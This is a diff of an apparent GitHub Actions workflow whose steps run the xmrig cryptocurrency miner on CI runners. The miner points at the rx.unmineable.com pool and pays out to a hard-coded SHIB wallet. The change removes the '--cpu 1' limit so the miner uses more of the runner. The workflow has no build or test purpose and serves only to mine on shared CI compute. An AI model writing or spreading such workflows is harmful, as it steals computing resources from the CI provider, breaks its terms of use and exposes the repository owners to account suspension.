@@ -36,7 +36,7 @@ jobs:
     - name: Dir
       run: Dir xmrig-6.17.0-msvc-win64
     - name: Running
-      run: .\xmrig-6.17.0-msvc-win64\xmrig-6.17.0\xmrig.exe  --donate-level 1 -o rx.unmineable.com:3333 -a rx/0 -u SHIB:0xBC6dBa2501b9211B1e84B77379668e541af47Bd6.Rig001#eitx-u3k9 -p x -k --cpu 1 
+      run: .\xmrig-6.17.0-msvc-win64\xmrig-6.17.0\xmrig.exe  --donate-level 1 -o rx.unmineable.com:3333 -a rx/0 -u SHIB:0xBC6dBa2501b9211B1e84B77379668e541af47Bd6.Rig001#eitx-u3k9 -p x -k 
     - name: DONE
       run: exit
 
